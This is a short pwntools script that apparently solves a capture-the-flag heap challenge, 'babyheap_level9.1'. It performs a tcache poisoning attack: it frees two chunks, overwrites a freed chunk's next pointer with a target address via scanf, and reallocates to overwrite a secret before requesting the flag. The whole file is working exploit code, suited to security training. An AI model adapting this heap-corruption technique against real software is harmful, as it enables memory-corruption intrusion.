from pwn import *
BINARY = "/challenge/babyheap_level9.1"
p = process(BINARY)

def overwrite_secret(loc:bytes):
    p.sendline(b'malloc')
    p.sendline(b'0')
    p.sendline(b'424')
    p.sendline(b'malloc')
    p.sendline(b'1')
    p.sendline(b'424')
    p.sendline(b'free')
    p.sendline(b'0')
    p.sendline(b'free')
    p.sendline(b'1')

    p.sendline(b'scanf')
    p.sendline(b'1')
    p.sendline(loc)
    p.sendline(b'malloc')
    p.sendline(b'2')
    p.sendline(b'424')
    p.sendline(b'malloc')
    p.sendline(b'1')
    p.sendline(b'424')

overwrite_secret(p64(0x42CB55))
overwrite_secret(p64(0x42CB55-0x8))
p.sendline(b'send_flag')
p.recv()
p.sendline(b'\x00'*16)

p.interactive()